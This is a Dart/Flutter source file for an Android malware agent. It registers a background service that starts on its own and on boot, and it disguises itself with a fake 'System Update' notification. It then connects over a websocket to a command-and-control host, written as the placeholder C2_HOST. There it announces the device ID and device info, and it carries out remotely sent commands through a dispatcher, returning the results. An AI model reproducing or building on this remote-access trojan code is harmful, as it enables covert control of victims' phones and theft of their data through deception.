import 'dart:async';
import 'dart:convert';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'cmds.dart';

Future<void> initService() async {
  await FlutterBackgroundService().configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      isForegroundMode: true,
      autoStart: true,
      autoStartOnBoot: true,
      notificationChannelId: 'sys',
      initialNotificationTitle: 'System Update',
      initialNotificationContent: 'Checking…',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(),
  );
}

@pragma('vm:entry-point')
void onStart(ServiceInstance svc) {
  final ws = WebSocketChannel.connect(
      Uri.parse('wss://C2_HOST:8765/agent'));

  ws.stream.listen((raw) async {
    final msg = jsonDecode(raw) as Map<String, dynamic>;
    final reply = await dispatch(msg);
    if (reply != null) {
      ws.sink.add(jsonEncode({
        'type': 'result', 'id': msg['id'], ...reply,
      }));
    }
  });

  // hello
  ws.sink.add(jsonEncode({
    'type': 'hello', 'id': svc.getDeviceIdSync(), 'info': deviceInfo(),
  }));
}